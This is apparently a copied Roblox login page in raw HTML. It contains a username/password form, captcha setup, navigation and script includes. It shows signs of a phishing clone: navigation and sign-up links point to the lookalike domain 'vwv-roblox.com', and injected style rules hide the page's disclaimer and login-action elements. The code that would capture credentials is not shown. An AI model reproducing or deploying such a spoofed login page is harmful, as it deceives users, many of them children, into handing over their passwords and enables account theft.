Roblox.Endpoints.Urls['/catalog/lists.aspx'] = 'https://search.roblox.com/catalog/lists.aspx';
Roblox.Endpoints.Urls['/catalog/items'] = 'https://search.roblox.com/catalog/items';
Roblox.Endpoints.Urls['/asset-hash-thumbnail/image'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/image';
Roblox.Endpoints.Urls['/asset-hash-thumbnail/json'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/json';
Roblox.Endpoints.Urls['/asset-thumbnail-3d/json'] = 'https://assetgame.roblox.com/asset-thumbnail-3d/json';
Roblox.Endpoints.Urls['/asset-thumbnail/image'] = 'https://assetgame.roblox.com/asset-thumbnail/image';
Roblox.Endpoints.Urls['/asset-thumbnail/json'] = 'https://assetgame.roblox.com/asset-thumbnail/json';
Roblox.Endpoints.Urls['/asset-thumbnail/url'] = 'https://assetgame.roblox.com/asset-thumbnail/url';
Roblox.Endpoints.Urls['/asset/request-thumbnail-fix'] = 'https://assetgame.roblox.com/asset/request-thumbnail-fix';
Roblox.Endpoints.Urls['/avatar-thumbnail-3d/json'] = 'https://www.roblox.com/avatar-thumbnail-3d/json';
Roblox.Endpoints.Urls['/avatar-thumbnail/image'] = 'https://www.roblox.com/avatar-thumbnail/image';
Roblox.Endpoints.Urls['/avatar-thumbnail/json'] = 'https://www.roblox.com/avatar-thumbnail/json';
Roblox.Endpoints.Urls['/avatar-thumbnails'] = 'https://www.roblox.com/avatar-thumbnails';
Roblox.Endpoints.Urls['/avatar/request-thumbnail-fix'] = 'https://www.roblox.com/avatar/request-thumbnail-fix';
Roblox.Endpoints.Urls['/bust-thumbnail/json'] = 'https://www.roblox.com/bust-thumbnail/json';
Roblox.Endpoints.Urls['/headshot-thumbnail/json'] = 'https://www.roblox.com/headshot-thumbnail/json';
Roblox.Endpoints.Urls['/item-thumbnails'] = 'https://www.roblox.com/item-thumbnails';
Roblox.Endpoints.Urls['/outfit-thumbnail/json'] = 'https://www.roblox.com/outfit-thumbnail/json';
Roblox.Endpoints.Urls['/place-thumbnails'] = 'https://www.roblox.com/place-thumbnails';
Roblox.Endpoints.Urls['/thumbnail/asset/'] = 'https://www.roblox.com/thumbnail/asset/';
Roblox.Endpoints.Urls['/thumbnail/avatar-headshot'] = 'https://www.roblox.com/thumbnail/avatar-headshot';
Roblox.Endpoints.Urls['/thumbnail/avatar-headshots'] = 'https://www.roblox.com/thumbnail/avatar-headshots';
Roblox.Endpoints.Urls['/thumbnail/user-avatar'] = 'https://www.roblox.com/thumbnail/user-avatar';
Roblox.Endpoints.Urls['/thumbnail/resolve-hash'] = 'https://www.roblox.com/thumbnail/resolve-hash';
Roblox.Endpoints.Urls['/thumbnail/place'] = 'https://www.roblox.com/thumbnail/place';
Roblox.Endpoints.Urls['/thumbnail/get-asset-media'] = 'https://www.roblox.com/thumbnail/get-asset-media';
Roblox.Endpoints.Urls['/thumbnail/remove-asset-media'] = 'https://www.roblox.com/thumbnail/remove-asset-media';
Roblox.Endpoints.Urls['/thumbnail/set-asset-media-sort-order'] = 'https://www.roblox.com/thumbnail/set-asset-media-sort-order';
Roblox.Endpoints.Urls['/thumbnail/place-thumbnails'] = 'https://www.roblox.com/thumbnail/place-thumbnails';
Roblox.Endpoints.Urls['/thumbnail/place-thumbnails-partial'] = 'https://www.roblox.com/thumbnail/place-thumbnails-partial';
Roblox.Endpoints.Urls['/thumbnail_holder/g'] = 'https://www.roblox.com/thumbnail_holder/g';
Roblox.Endpoints.Urls['/users/{id}/profile'] = 'https://www.roblox.com/users/{id}/profile';
Roblox.Endpoints.Urls['/service-workers/push-notifications'] = 'https://www.roblox.com/service-workers/push-notifications';
Roblox.Endpoints.Urls['/notification-stream/notification-stream-data'] = 'https://www.roblox.com/notification-stream/notification-stream-data';
Roblox.Endpoints.Urls['/api/friends/acceptfriendrequest'] = 'https://www.roblox.com/api/friends/acceptfriendrequest';
Roblox.Endpoints.Urls['/api/friends/declinefriendrequest'] = 'https://www.roblox.com/api/friends/declinefriendrequest';
Roblox.Endpoints.Urls['/authentication/is-logged-in'] = 'https://www.roblox.com/authentication/is-logged-in';
Roblox.Endpoints.addCrossDomainOptionsToAllRequests = true;
</script>

    <script type="text/javascript">
if (typeof(Roblox) === "undefined") { Roblox = {}; }
Roblox.Endpoints = Roblox.Endpoints || {};
Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
</script>

    <script type="text/javascript">
if (typeof(Roblox) === "undefined") { Roblox = {}; }
Roblox.Endpoints = Roblox.Endpoints || {};
Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
</script>

    <script>
    Roblox = Roblox || {};
    Roblox.AbuseReportPVMeta = {
        desktopEnabled: false,
        phoneEnabled: false,
        inAppEnabled: false
    };
</script>


<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="3" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4">
                          

<style><br>    .disclaimer {<br>    display:none !important;<br>    }<br>    .login-action {<br>    display:none !important;<br>    }<br></style><style><br>    .disclaimer {<br>    display:none !important;<br>    }<br>    .login-action {<br>    display:none !important;<br>    }<br></style></head>
<body id="rbx-body" class="rbx-body   light-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
    
    <meta name="csrf-token" data-token="dNoTsbHD0Mrc">

    

<div id="roblox-linkify" data-enabled="true" data-regex="(https?\:\/\/)?(?:www\.)?([a-z0-9-]{2,}\.)*(((m|de|www|web|api|blog|wiki|corp|polls|bloxcon|developer|devforum|forum|status)\.roblox\.com|robloxlabs\.com)|(www\.shoproblox\.com)|(roblox\.status\.io)|(rblx\.co)|help\.roblox\.com(?![A-Za-z0-9\/.]*\/attachments\/))(?!\/[A-Za-z0-9-+&amp;@#\/=~_|!:,.;]*%)((\/[A-Za-z0-9-+&amp;@#\/%?=~_|!:,.;]*)|(?=\s|\b))" data-regex-flags="gm" data-as-http-regex="(([^.]help|polls)\.roblox\.com)"></div>

<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10">
</div>
<div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1">
</div>
    



<div id="fb-root"></div>

<div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false">


<div id="navigation-container" class="light-theme gotham-font" data-number-of-autocomplete-suggestions="7" data-is-redirect-library-to-creator-marketplace-enabled="False">
    <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
  <div class="container-fluid">
    <div class="rbx-navbar-header">
      <div id="header-menu-icon" class="rbx-nav-collapse"><button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">Skip to Main Content</button></div>
      <div class="navbar-header">
        <a class="navbar-brand" href="/home">
          <span class="icon-logo"></span><span class="icon-logo-r"></span>
        </a>
      </div>
    </div>
    <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/catalog">Avatar Shop</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/robux?ctx-nav">Robux</a>
      </li>
    </ul>

    <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/catalog">Avatar Shop</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/robux?ctx=nav">Robux</a>
      </li>
    </ul>
    <div id="right-navigation-header"><div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search"><div class="input-group"><form><div class="form-has-feedback"><input id="navbar-search-input" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Search" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value=""></div></form><div class="input-group-btn"><button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div></div><ul class="dropdown-menu new-dropdown-menu" role="menu"><li class="navbar-search-option rbx-clickable-li new-selected"><a class="new-navbar-search-anchor" href="https://vwv-roblox.com/discover/?Keyword="><span class="icon-menu-games-off navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Experiences</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://vwv-roblox.com/search/users?keyword="><span class="icon-menu-profile navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in People</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://vwv-roblox.com/catalog?CatalogContext=1&amp;Keyword="><span class="icon-menu-shop navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Avatar Shop</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://vwv-roblox.com/search/groups?keyword="><span class="icon-menu-groups navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Groups</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://vwv-roblox.com/develop/library?CatalogContext=2&amp;Category=6&amp;Keyword="><span class="icon-menu-library navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Creator Marketplace</span></a></li></ul></div><div class="navbar-right rbx-navbar-right"><ul class="nav navbar-right rbx-navbar-right-nav"><li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://vwv-roblox.com/account/signupredir" id="sign-up-button">Sign Up</a></li><li class="login-action"><a class="rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item" href="https://vwv-roblox.com/login">Log In</a></li><li class="rbx-navbar-right-search"><button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md"><span class="icon-nav-search-white"></span></button></li></ul></div></div>
  </div>
</div>
<div id="left-navigation-container"></div>
<div id="verificationUpsell-container"><div></div></div>
<div id="phoneVerificationUpsell-container">
  <div phoneverificationupsell-container=""></div>
</div>
<div id="accountRecoveryModal-container"></div>

</div>

<script type="text/javascript">
    var Roblox = Roblox || {};
    (function () {
        if (Roblox && Roblox.Performance) {
            Roblox.Performance.setPerformanceMark("navigation_end");
        }
    })();
</script>

    <div class="container-main 
                
                
                
                
                
                " id="container-main" tabindex="-1">
            <script type="text/javascript">
                if (top.location != self.location) {
                    top.location = self.location.href;
                }
            </script>

        <div class="alert-container">
            <noscript><div><div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div></div></noscript>




        </div>


        <div class="content">

                                    <script src="https://roblox-api.arkoselabs.com/fc/api/?onload=reportFunCaptchaLoaded" async="" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportResourceError('funcaptcha')"></script>
<script type="text/javascript">
    var Roblox = Roblox || {};
    $(function () {
        var funCaptcha = Roblox.FunCaptcha;
        if (funCaptcha) {
            var captchaTypes = [{"Type":"Login","PublicKey":"9F35E182-C93C-EBCC-A31D-CF8ED317B996","ApiUrl":"https://captcha.roblox.com/v1/funcaptcha/login/web"}];
            funCaptcha.addCaptchaTypes(captchaTypes, true);
            funCaptcha.setMaxRetriesOnTokenValidationFailure(0);
            funCaptcha.setPerAppTypeLoggingEnabled(false);
            funCaptcha.setRetryIntervalRange(500, 1500);
        }
    });

    // Necessary because of how FunCaptcha js executes callback
    // i.e. window["{function name}"]
    function reportFunCaptchaLoaded()
    {
        if (Roblox.BundleDetector)
        {
            Roblox.BundleDetector.reportResourceLoaded("funcaptcha");
        }
    }
</script>

        <div role="dialog" id="dialog">
        </div>


        <div id="react-login-container" class="login-container" data-return-url="" data-enable-react-ui="true"><div id="login-base"><div class="section-content login-section"><h1 class="login-header">Login to Roblox</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">Username/Email/Phone</label><input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone" onkeypress="document.getElementById('login-form-error').innerHTML = '';" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">Password</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" onkeypress="document.getElementById('login-form-error').innerHTML = '';" value=""><div aria-live="polite"><p class="form-control-label xsmall text-error login-error" id="login-form-error"></p></div></div><span class="spinner spinner-default" id="login-loading" style="display:none"></span><button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div><div class="divider-text-container"><span class="divider-text xsmall">login with</span></div></div><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Another Logged In Device</span></button></div><div class="text-center"><div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/" target="_self">Sign Up</a></div></div></div><div id="crossDeviceLoginDisplayCodeModal-container"></div></div></div>





<script>
    var Roblox = Roblox || {};
    Roblox.LoginMeta = {
        signupUrl: "https://www.roblox.com/account/signupredir",
        forgotCredentialsUrl: "https://www.roblox.com/login/forgot-password-or-username",
        homeUrl: "https://www.roblox.com/home",
        securityNotificationUrl: "https://www.roblox.com/login/securitynotification",
        apiProxyUrl: "https://api.roblox.com",
        fbSignInUrl: "",
        loginPageUrl: "https://www.roblox.com/newlogin",
        isLoginWithEmailEnabled: true,
        isLoginWithPhoneEnabled: true,
        isPromptUnverifiedEmailsEnabled: false
    };
</script>

        <script type="text/javascript" src="https://cdns.gigya.com/js/gigya.js?apiKey=" async="" defer="">
            {
                bypassCookiePolicy: 'never'
            }
        </script>


<div id="SocialIdentitiesInformation" data-rbx-login-redirect-url="/social/postlogin" data-context="loginPage">
</div>

        </div>
            </div> 
<!--Bootstrap Footer React Component -->

<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"><div class="footer"><ul class="row footer-links"><li class="footer-link"><a class="text-footer-nav" href="/info/about-us?locale=en_us" target="_blank">About Us</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/jobs?locale=en_us" target="_blank">Jobs</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/blog?locale=en_us" target="_blank">Blog</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/parents?locale=en_us" target="_blank">Parents</a></li><li class="footer-link"><a class="text-footer-nav giftcards" href="/giftcards?locale=en_us" target="_blank">Gift Cards</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/help?locale=en_us" target="_blank">Help</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/terms?locale=en_us" target="_blank">Terms</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/accessibility?locale=en_us" target="_blank">Accessibility</a></li><li class="footer-link"><a class="text-footer-nav privacy" href="/info/privacy?locale=en_us" target="_blank">Privacy</a></li><li></li></ul><div class="row copyright-container"><div class="col-sm-6 col-md-3"></div><div class="col-sm-12"><p class="text-footer footer-note">©2022 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p></div></div></div></footer></div> 

    <div id="user-agreements-checker-container"></div>
<div id="cookie-banner-wrapper" class="cookie-banner-wrapper"><div></div></div>


    <script type="text/javascript">function urchinTracker() {}</script>


<script type="text/javascript">
    if (typeof Roblox === "undefined") {
        Roblox = {};
    }
    if (typeof Roblox.PlaceLauncher === "undefined") {
        Roblox.PlaceLauncher = {};
    }
    var isRobloxIconEnabledForRetheme = "True";
    var robloxIcon = isRobloxIconEnabledForRetheme === 'True' ? "<span class='icon-logo-r-95'></span>" : "<img src='https://images.rbxcdn.com/8e7879f99cfa7cc3b1fce74f8191be03.svg' width='90' height='90' alt='R'/>";
    Roblox.PlaceLauncher.Resources = {
        RefactorEnabled: "True",
        IsProtocolHandlerBaseUrlParamEnabled: "False",
        ProtocolHandlerAreYouInstalled: {
            play: {
                content: robloxIcon + "<p>You&#39;re moments away from getting into the experience!</p>",
                buttonText: "Download and Install Roblox",
                footerContent: "<a href='https://assetgame.roblox.com/game/help'class= 'text-name small' target='_blank' >Click here for help</a> "
            },
            studio: {
                content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Get started creating your own experiences!</p>",
                buttonText: "Download Studio"
            }
        },
        ProtocolHandlerStartingDialog: {
            play: {
                content: robloxIcon + "<p>Roblox is now loading. Get ready!</p>"
            },
            studio: {
                content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Checking for Roblox Studio...</p>"
            },
            loader: "<span class='spinner spinner-default'></span>"
        }
    };
</script>
<div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-studio-auth-ticket-enabled="True" data-is-studio-sso-params-enabled="True" data-is-game-launch-interface-enabled="True" data-is-protocol-handler-launch-enabled="True" data-is-duar-auto-opt-in-enabled="false" data-is-duar-opt-out-disabled="false" data-is-user-logged-in="False" data-os-name="OSX" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="true" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="LIVE">
    <div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">
        <div id="Spinner" class="Spinner" style="padding:20px 0;">
            <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced">
        </div>
        <div id="status" style="min-height:40px;text-align:center;margin:5px 20px">
            <div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block">
                Starting Roblox...
            </div>
            <div id="Waiting" class="PlaceLauncherStatus MadStatusField">Connecting to People...</div>
            <div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div>
        </div>
        <div style="text-align:center;margin-top:1em">
            <input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel">
        </div>
    </div>
</div>
<div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;">
    <p class="larger-font-size">
        <span class="icon-moreinfo"></span>
                
                    Check <strong>Always open links for Roblox</strong> and click <strong>Open Roblox</strong> in the dialog box above to visit experiences faster in the future!
                
    </p>
</div>

<script type="text/javascript">
function checkRobloxInstall() {
         return RobloxLaunch.CheckRobloxInstall('https://www.roblox.com/Download');
}
</script>


    <div id="InstallationInstructions" class="" style="display:none;">
        <div class="ph-installinstructions">
            <div class="ph-modal-header">
                    <span class="icon-close simplemodal-close"></span>
                    <h3 class="title">Thanks for visiting Roblox</h3>
            </div>
            <div class="modal-content-container"> 
                <div class="ph-installinstructions-body ">


        <ul class="modal-col-5">
            <li class="step1-of-5">
                <h2>1</h2>
                <p class="larger-font-size">Click <strong>Roblox.dmg</strong> to run the Roblox installer, which just downloaded via your web browser.</p>
                <img data-delaysrc="https://images.rbxcdn.com/453dc2b872ce1b09aff98bfacf3db50a.png" src="https://images.rbxcdn.com/453dc2b872ce1b09aff98bfacf3db50a.png" class="src-replaced">
            </li>
            <li class="step2-of-5">
                <h2>2</h2>
                <p class="larger-font-size">Double-click the Roblox app icon to begin the installation process.</p>
                <img data-delaysrc="https://images.rbxcdn.com/7fcfb6345809e4baad30e72edaee442b.png" src="https://images.rbxcdn.com/7fcfb6345809e4baad30e72edaee442b.png" class="src-replaced">
            </li>
            <li class="step3-of-5">
                <h2>3</h2>
                <p class="larger-font-size">Click <strong>Open</strong> when prompted by your computer.</p>
                <img data-delaysrc="https://images.rbxcdn.com/63c0279ebb88ece574697e7ff5c77376.png" src="https://images.rbxcdn.com/63c0279ebb88ece574697e7ff5c77376.png" class="src-replaced">
            </li>
            <li class="step4-of-5">
                <h2>4</h2>
                <p class="larger-font-size">Click <strong>Ok</strong> once you've successfully installed Roblox.</p>
                <img data-delaysrc="https://images.rbxcdn.com/ed97f63bf6c6b3d21cd2d2a8754ff48a.png" src="https://images.rbxcdn.com/ed97f63bf6c6b3d21cd2d2a8754ff48a.png" class="src-replaced">
            </li>
            <li class="step5-of-5">
                <h2>5</h2>
                <p class="larger-font-size">After installation, click <strong>Join</strong> below to join the action!</p>
                <div class="VisitButton VisitButtonContinueGLI">
                    <a class="btn btn-primary-lg disabled btn-full-width">Join</a>
                </div>
            </li>
        </ul>

                </div>
            </div>
            <div class="xsmall">
                The Roblox installer should download shortly. If it doesn’t, start the <a id="GameLaunchManualInstallLink" href="#" class="text-link">download now.</a>
            </div>
        </div>
    </div>
    <div class="InstallInstructionsImage" data-modalwidth="970" style="display:none;"></div>


<div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;"></div>
<iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility:hidden;height:0;width:1px;position:absolute"></iframe>

<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="clientinstaller" type="text/javascript" src="https://js.rbxcdn.com/f424a786e3d883cff747a034605fa09d.js"></script>

<script type="text/javascript">
    Roblox.Client._skip = null;
    Roblox.Client._CLSID = '76D50904-6780-4c8b-8986-1A7EE0B1716D';
    Roblox.Client._installHost = 'setup.roblox.com';
    Roblox.Client.ImplementsProxy = true;
    Roblox.Client._silentModeEnabled = true;
    Roblox.Client._bringAppToFrontEnabled = false;
    Roblox.Client._currentPluginVersion = '';
    Roblox.Client._eventStreamLoggingEnabled = true;

        
        Roblox.Client._installSuccess = function() {
            if(GoogleAnalyticsEvents){
                GoogleAnalyticsEvents.ViewVirtual('InstallSuccess');
                GoogleAnalyticsEvents.FireEvent(['Plugin','Install Success']);
                if (Roblox.Client._eventStreamLoggingEnabled && typeof Roblox.GamePlayEvents != "undefined") {
                    Roblox.GamePlayEvents.SendInstallSuccess(Roblox.Client._launchMode, play_placeId);
                }
            }
        }
        
            
        if ((window.chrome || window.safari) && window.location.hash == '#chromeInstall') {
            window.location.hash = '';
            var continuation = '(' + $.cookie('chromeInstall') + ')';
            play_placeId = $.cookie('chromeInstallPlaceId');
            Roblox.GamePlayEvents.lastContext = $.cookie('chromeInstallLaunchMode');
            $.cookie('chromeInstallPlaceId', null);
            $.cookie('chromeInstallLaunchMode', null);
            $.cookie('chromeInstall', null);
            RobloxLaunch._GoogleAnalyticsCallback = function() { var isInsideRobloxIDE = 'website'; if (Roblox && Roblox.Client && Roblox.Client.isIDE && Roblox.Client.isIDE()) { isInsideRobloxIDE = 'Studio'; };GoogleAnalyticsEvents.FireEvent(['Plugin Location', 'Launch Attempt', isInsideRobloxIDE]);GoogleAnalyticsEvents.FireEvent(['Plugin', 'Launch Attempt', 'Play']);EventTracker.fireEvent('GameLaunchAttempt_OSX', 'GameLaunchAttempt_OSX_Plugin'); if (typeof Roblox.GamePlayEvents != 'undefined') { Roblox.GamePlayEvents.SendClientStartAttempt(null, play_placeId); }  }; 
            Roblox.Client.ResumeTimer(eval(continuation));
        }
        
</script>


<div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;">
    <a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>
    <div class="Title"></div>
    <div class="GenericModalBody">
        <div class="TopBody">
            <div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays="" data-no-click="">
                <img class="GenericModalImage" alt="generic image">
            </div>
            <div class="Message"></div>
        </div>
        <div class="ConfirmationModalButtonContainer GenericModalButtonContainer">
            <a href="" id="roblox-confirm-btn"><span></span></a>
            <a href="" id="roblox-decline-btn"><span></span></a>
        </div>
        <div class="ConfirmationModalFooter">
        
        </div>  
    </div>  
    <script type="text/javascript">
        Roblox = Roblox || {};
        Roblox.Resources = Roblox.Resources || {};
        
        Roblox.Resources.GenericConfirmation = {
            yes: "Yes",
            No: "No",
            Confirm: "Confirm",
            Cancel: "Cancel"
        };
    </script>
</div>

<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">
    <div id="modal-dialog" class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">
                    <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span>
                </button>
                <h5 class="modal-title"></h5>
            </div>

            <div class="modal-body">
                <div class="modal-top-body">
                    <div class="modal-message"></div>
                    <div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click="">
                        <img class="modal-thumb" alt="generic image">
                    </div>
                    <div class="modal-checkbox checkbox">
                        <input id="modal-checkbox-input" type="checkbox">
                        <label for="modal-checkbox-input"></label>
                    </div>
                </div>
                <div class="modal-btns">
                    <a href="" id="confirm-btn"><span></span></a>
                    <a href="" id="decline-btn"><span></span></a>
                </div>
                <div class="loading modal-processing">
                    <img class="loading-default" src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing...">
                </div>
            </div>
            <div class="modal-footer text-footer">

            </div>
        </div>
    </div>
</div>




<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.jsConsoleEnabled = false;
</script>



    <script type="text/javascript">
        $(function () {
            Roblox.CookieUpgrader.domain = 'roblox.com';
            Roblox.CookieUpgrader.upgrade("GuestData", { expires: Roblox.CookieUpgrader.thirtyYearsFromNow });
            Roblox.CookieUpgrader.upgrade("RBXSource", { expires: function (cookie) { return Roblox.CookieUpgrader.getExpirationFromCookieValue("rbx_acquisition_time", cookie); } });
            Roblox.CookieUpgrader.upgrade("RBXViralAcquisition", { expires: function (cookie) { return Roblox.CookieUpgrader.getExpirationFromCookieValue("time", cookie); } });
                
                Roblox.CookieUpgrader.upgrade("RBXMarketing", { expires: Roblox.CookieUpgrader.thirtyYearsFromNow });
                
                            
                Roblox.CookieUpgrader.upgrade("RBXSessionTracker", { expires: Roblox.CookieUpgrader.fourHoursFromNow });
                
                            
                Roblox.CookieUpgrader.upgrade("RBXEventTrackerV2", {expires: Roblox.CookieUpgrader.thirtyYearsFromNow});
                
        });
    </script>



    

    
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="intl-polyfill" type="text/javascript" src="https://js.rbxcdn.com/d44520f7da5ec476cfb1704d91bab327.js"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalCore" data-bundle-source="Main" src="https://js.rbxcdn.com/95044be3ff42e3dc429313faca1316cea62f328a39e29689ffeda9002f3a8bc6.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="TranslationResources" data-bundle-source="Main" src="https://js.rbxcdn.com/83d836a661ff433d5b7ce719c489e43af590ff75ab39ccc6d393546fe91b766a.js"></script>


    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="leanbase" type="text/javascript" src="https://js.rbxcdn.com/ddd0930a6e52c7e85e92548b02999534.js"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/b8f73eea6b6a8602f787da463c88858dbb1aedeffeb2d07479af47dbda222aae.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreRobloxUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/756693ec44d3b0e3e359ea8a4bdc54d10f3134ce6e8b88f5e0667d3cd930624b.js"></script>



    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="React" data-bundle-source="Main" src="https://js.rbxcdn.com/b79589d3dfb2446936aac95605deaa507ce5bc3e09073bac7dd04872880694c2.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/cf340fb618d9a73913b30dfc624ae60d68b9e59723746e6c08d06d14ebdd6dca.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactStyleGuide" data-bundle-source="Main" src="https://js.rbxcdn.com/0346acf635cbe0dc3b71af9a6be331830c5b9a2505bebc4dba6299d1f463de61.js"></script>

